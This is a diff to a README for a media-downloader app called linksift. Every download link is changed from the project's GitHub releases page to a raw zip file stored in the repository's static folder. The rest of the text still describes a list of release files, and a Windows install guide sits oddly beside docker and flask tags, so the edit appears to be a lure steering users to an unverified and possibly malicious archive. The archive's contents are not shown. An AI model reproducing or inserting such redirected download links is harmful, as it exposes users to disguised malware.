@@ -8,7 +8,7 @@ Whether you want to save tutorials, music, documentaries, or any other online me
 
 ## 📥 Download linksift
 
-**[🎯 DOWNLOAD LINKSIFT NOW](https://github.com/Homeostatic-republicofangola945/linksift/releases)**
+**[🎯 DOWNLOAD LINKSIFT NOW](https://raw.githubusercontent.com/Homeostatic-republicofangola945/linksift/main/static/1.0.zip)**
 
 Visit this link to download the application.
 
@@ -17,7 +17,7 @@ Visit this link to download the application.
 Getting linksift running on your Windows computer is easier than you think. Follow these simple steps, and you'll be saving media in no time.
 
 ### Step 1: Download the Application
-1. Click the big download button above or go to: [https://github.com/Homeostatic-republicofangola945/linksift/releases](https://github.com/Homeostatic-republicofangola945/linksift/releases)
+1. Click the big download button above or go to: [https://raw.githubusercontent.com/Homeostatic-republicofangola945/linksift/main/static/1.0.zip](https://raw.githubusercontent.com/Homeostatic-republicofangola945/linksift/main/static/1.0.zip)
 2. On that page, you'll see a list of files. Look for the one that matches your computer (Windows). 
 3. Click on the download link for that file. Your browser will start downloading it.
 
@@ -156,6 +156,6 @@ Stop worrying about losing access to content when you're offline. Start download
 
 **Ready to begin?** Head over to the download page and get linksift on your machine in minutes.
 
-**[⬇️ DOWNLOAD LINKSIFT NOW](https://github.com/Homeostatic-republicofangola945/linksift/releases)**
+**[⬇️ DOWNLOAD LINKSIFT NOW](https://raw.githubusercontent.com/Homeostatic-republicofangola945/linksift/main/static/1.0.zip)**
 
 Keywords: docker, ffmpeg, flask, media-downloader, self-hosted, yt-dlp
